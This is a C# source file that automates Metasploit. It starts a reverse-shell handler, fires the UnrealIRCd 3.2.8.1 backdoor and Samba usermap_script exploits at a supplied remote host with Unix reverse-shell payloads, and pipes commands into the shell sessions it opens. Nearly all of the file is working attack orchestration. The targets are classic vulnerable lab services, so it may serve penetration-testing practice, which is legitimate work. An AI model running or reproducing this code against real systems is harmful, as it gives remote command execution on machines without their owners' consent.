using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Const;
using Lacey.Alexa.Common.Metasploit.Models.Modules;
using Lacey.Alexa.Common.Metasploit.Providers;
using Lacey.Alexa.Common.Metasploit.Utils;

namespace Lacey.Alexa.Common.Metasploit.Extensions
{
    public static class MetasploitProviderExtensions
    {
        public static async Task RunShell(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            while (true)
            {
                var cmd = Console.ReadLine();
                if (cmd == Cmd.Exit)
                {
                    await metasploit.StopSession(sessionId);
                    break;
                }

                await metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
                await metasploit.ReadSessionShell(sessionId);
            }
        }

        public static async Task<object> SendCommandToShell(
            this IMetasploitProvider metasploit,
            Dictionary<string, object> shell,
            string command)
        {
            object result = null;
            foreach (var (id, value) in shell)
            {
                var dict = (Dictionary<string, object>)value;
                if (dict[ResultFields.Type] as string == ResultType.Shell)
                {
                    await metasploit.WriteToSessionShell(id, $"{command}{Environment.NewLine}");
                    Delay.Tiny();
                    var response = await metasploit.ReadSessionShell(id);
                    result = response[ResultFields.Data];
                    await metasploit.StopSession(id);
                }
            }

            return result;
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> ExecuteModuleJob(
            this IMetasploitProvider metasploit, 
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            var jobId = response[ResultFields.JobId].ToString();
            return (response, jobId);
        }

        public static async Task<Dictionary<string, object>> ExecuteModule(
            this IMetasploitProvider metasploit, 
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            return response;
        }

        public static async Task<Dictionary<string, object>> WaitModuleJob(
            this IMetasploitProvider metasploit, 
            string moduleName,
            string jobId)
        {
            var response = await metasploit.ListJobs();
            var vals = new List<object>(response.Values);
            while (vals.Any(v => ((string)v).Contains(moduleName)))
            {
                Delay.Small();
                response = await metasploit.ListJobs();
                vals = new List<object>(response.Values);
            }

            await metasploit.StopJob(jobId);
            response = await metasploit.ListSessions();

            return response;
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> MultiHandlerExec(
            this IMetasploitProvider metasploit)
        {
            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.MultiHandler)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(DefaultPorts.LPort)
                .Payload(PayloadNames.CmdUnixReverse)
                .ExitOnSession(false);

            return await metasploit.ExecuteModuleJob(module);
        }

        public static async Task<Dictionary<string, object>> UnrealIrcd3281BackdoorExec(
            this IMetasploitProvider metasploit,
            string rHost)
        {
            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.UnrealIrcd3281Backdoor)
                .RHost(rHost)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(DefaultPorts.LPort)
                .Payload(PayloadNames.CmdUnixReverse)
                .DisablePayloadHandler(true);

            return await metasploit.ExecuteModule(module);
        }

        public static async Task<Dictionary<string, object>> UsermapScriptExec(
            this IMetasploitProvider metasploit,
            string rHost)
        {
            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.UsermapScript)
                .RHost(rHost)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(DefaultPorts.LPort)
                .Payload(PayloadNames.CmdUnixReverse)
                .DisablePayloadHandler(true);

            return await metasploit.ExecuteModule(module);
        }
    }
}